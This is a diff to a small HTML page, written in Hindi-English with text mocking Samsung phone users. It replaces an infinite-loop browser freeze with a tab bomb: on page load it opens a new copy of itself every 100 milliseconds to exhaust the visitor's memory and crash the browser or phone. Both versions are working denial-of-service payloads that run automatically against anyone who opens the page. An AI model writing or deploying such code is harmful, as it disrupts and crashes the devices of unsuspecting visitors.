@@ -1,18 +1,17 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Auto Crash on Load</title>
+    <title>RAM ka The End</title>
     <script>
-      // Jaise hi page load hoga, yeh function chalega aur browser ka band bajayega
       window.onload = function () {
-        while (true) {
-          console.log("Samsung = Sabse bekaar company! Crashing browser...");
-        }
+        setInterval(function () {
+          window.open(window.location.href);
+        }, 100); // Har 100ms me ek nayi tab
       };
     </script>
   </head>
   <body>
-    <h1>Aree bhai! Tu is site pe aaya aur browser gaya!</h1>
-    <p>Samsung users already crying!</p>
+    <h1>Samsung = RIP</h1>
+    <p>Tabs tabs tabs... phone abhi gaya!</p>
   </body>
 </html>
